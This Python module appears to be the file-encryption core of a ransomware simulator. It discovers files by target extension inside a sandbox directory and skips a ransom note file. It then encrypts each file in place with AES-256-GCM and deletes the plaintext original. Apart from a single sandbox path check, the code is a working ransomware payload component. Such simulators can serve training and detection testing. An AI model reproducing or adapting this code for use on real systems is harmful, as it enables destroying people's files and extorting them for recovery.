"""
modules/file_encryptor.py
AES-256-GCM file encryption with per-file nonce and SHA-256 integrity tracking.

On-disk layout per encrypted file:
  [ NONCE_SIZE bytes ][ ciphertext + AUTH_TAG_SIZE bytes GCM tag ]
"""
from __future__ import annotations

import os
from dataclasses import dataclass
from pathlib import Path
from typing import List

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

import config
from utils.hashing import sha256_file
from utils.logger import get_logger
from utils.validator import is_within_sandbox

logger = get_logger(__name__, log_file=config.LOG_FILE)


@dataclass
class EncryptionResult:
    """Outcome of a single file encryption attempt."""
    path:             str
    original_size:    int
    sha256_before:    str
    encrypted_path:   str  = ""
    success:          bool = False
    original_removed: bool = False   # True if plaintext was deleted after encryption
    error:            str  = ""

# DecryptionResult lives in cleanup.py — it is not this module's concern.


class FileEncryptor:
    """Discovers and encrypts target files within a sandbox directory."""

    def __init__(self, key: bytes, sandbox: Path) -> None:
        if len(key) != config.KEY_SIZE:
            raise ValueError(
                f"AES-{config.KEY_SIZE * 8} requires a {config.KEY_SIZE}-byte key."
            )
        self._aesgcm = AESGCM(key)
        self.sandbox  = sandbox
        # No self.results — encrypt_all() returns the list directly.
        # Callers must hold the return value; do not re-query this object for results.

    # ── Discovery ─────────────────────────────────────────────────────────────

    def discover_files(self) -> List[Path]:
        """Return all unlocked target files inside the sandbox, sorted."""
        targets: List[Path] = []
        for ext in config.TARGET_EXTENSIONS:
            targets.extend(self.sandbox.rglob(f"*{ext}"))

        targets = sorted(
            p for p in set(targets)
            if not p.name.endswith(config.ENCRYPTED_EXT)
            and p.name != config.RANSOM_NOTE_NAME
        )
        logger.info("Discovery: %d target file(s) found in %s", len(targets), self.sandbox)
        for p in targets:
            logger.debug("  -> %s", p)
        return targets

    # ── Single-file encryption ────────────────────────────────────────────────

    def encrypt_file(self, path: Path) -> EncryptionResult:
        """Encrypt one file in-place. Returns EncryptionResult."""
        # Sandbox guard — checked exactly once, before any I/O.
        if not is_within_sandbox(path, self.sandbox):
            logger.warning("SKIP (outside sandbox): %s", path)
            return EncryptionResult(
                path=str(path),
                original_size=0,
                sha256_before="",
                error="Path outside sandbox — skipped.",
            )

        result = EncryptionResult(
            path=str(path),
            original_size=path.stat().st_size,
            sha256_before=sha256_file(path),
        )
        encrypted_path = path.with_suffix(path.suffix + config.ENCRYPTED_EXT)

        try:
            nonce      = os.urandom(config.NONCE_SIZE)
            plaintext  = path.read_bytes()
            ciphertext = self._aesgcm.encrypt(nonce, plaintext, None)

            # Layout: [ NONCE_SIZE B ][ ciphertext ][ AUTH_TAG_SIZE B GCM tag ]
            encrypted_path.write_bytes(nonce + ciphertext)
            result.encrypted_path = str(encrypted_path)
            result.success        = True

            try:
                path.unlink()
                result.original_removed = True
                logger.info(
                    "ENCRYPTED  %-45s  %d B  sha256=%.16s…",
                    path.name, result.original_size, result.sha256_before,
                )
            except PermissionError:
                result.original_removed = False
                logger.warning(
                    "ENCRYPTED  %-45s  (original could not be removed — permission denied)",
                    path.name,
                )

        except Exception as exc:
            result.error   = str(exc)
            result.success = False
            logger.error("FAILED to encrypt %s: %s", path, exc)
            try:
                if encrypted_path.exists():
                    encrypted_path.unlink()
            except Exception:
                pass

        return result

    # ── Batch encryption ──────────────────────────────────────────────────────

    def encrypt_all(self) -> List[EncryptionResult]:
        """Discover and encrypt all target files.

        Returns:
            List of EncryptionResult — one entry per discovered file.
            The caller owns this list; it is not stored on the instance.
        """
        files = self.discover_files()
        if not files:
            logger.warning("No target files found — nothing to encrypt.")
            return []

        results: List[EncryptionResult] = [self.encrypt_file(f) for f in files]

        ok = sum(1 for r in results if r.success)
        logger.info("Encryption complete: %d/%d files encrypted.", ok, len(files))
        return results
